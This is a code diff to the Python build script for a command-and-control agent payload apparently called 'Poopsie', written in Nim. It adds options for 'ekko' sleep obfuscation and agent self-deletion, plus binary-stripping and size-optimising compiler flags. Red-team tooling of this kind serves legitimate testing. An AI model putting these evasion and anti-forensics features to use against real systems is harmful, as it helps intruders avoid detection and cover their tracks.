@@ -45,6 +45,21 @@ class Poopsie(PayloadType):
             required=False,
         ),
         BuildParameter(
+            name="sleep_obfuscation",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Sleep obfuscation technique (Windows x64 only)",
+            default_value="none",
+            choices=["none", "ekko"],
+            required=True,
+        ),
+        BuildParameter(
+            name="self_delete",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Enable self-deletion of the agent on exit (Windows only)",
+            required=False,
+        ),
+        BuildParameter(
             name="adjust_filename",
             parameter_type=BuildParameterType.Boolean,
             description="Automatically adjust payload extension based on selected choices.",
@@ -97,6 +112,8 @@ class Poopsie(PayloadType):
 
             # Add build parameters
             c2_params["debug"] = str(self.get_parameter("debug"))
+            c2_params["sleep_obfuscation"] = self.get_parameter("sleep_obfuscation")
+            c2_params["self_delete"] = str(self.get_parameter("self_delete"))
 
             # Build environment from c2_params - convert all to env format
             build_env = {}
@@ -208,7 +225,18 @@ class Poopsie(PayloadType):
             nim_cpu = "amd64" if architecture == "x64" else "i386"
             
             # Determine target OS for cross-compilation
-            nim_args = ["-d:release", "--opt:size"]
+            nim_args = [
+                "-d:release",
+                "--opt:size",
+                "--mm:orc",                    # Use ORC memory management (default in Nim 2.0+)
+                "--panics:on",                 # Use panics instead of exceptions (smaller binary)
+                "--passC:-flto",               # Link-time optimization (smaller binary)
+                "--passL:-flto",               # Link-time optimization
+                "--passL:-s",                  # Strip symbols (smaller binary)
+                "--d:strip",                   # Strip debug info
+                "--d:useMalloc",               # Use system malloc (smaller)
+                "--parallelBuild:0",           # Auto-detect CPU cores for faster compilation
+            ]
             if selected_os == "Windows":
                 # Cross-compile for Windows using MinGW
                 if architecture == "x64":
@@ -238,8 +266,13 @@ class Poopsie(PayloadType):
             else:
                 output_name = "poopsie"
             
-            # Build command: nimble c (handles dependencies automatically from .nimble file)
-            cmd_args = ["nimble", "c", "-y"] + nim_args + ["src/poopsie.nim"]
+            # Build command: nim c directly (faster than nimble for rebuilds)
+            # Note: Dependencies should already be installed via nimble install in Dockerfile
+            cmd_args = ["nim", "c"] + nim_args + ["src/poopsie.nim"]
+            
+            # Enable ccache for faster recompilation (if available)
+            if os.path.exists("/usr/lib/ccache"):
+                env["PATH"] = f"/usr/lib/ccache:{env.get('PATH', '')}"
             
             # Build the command string for display
             env_str = ' '.join(f'{k}="{v}"' for k, v in build_env.items())
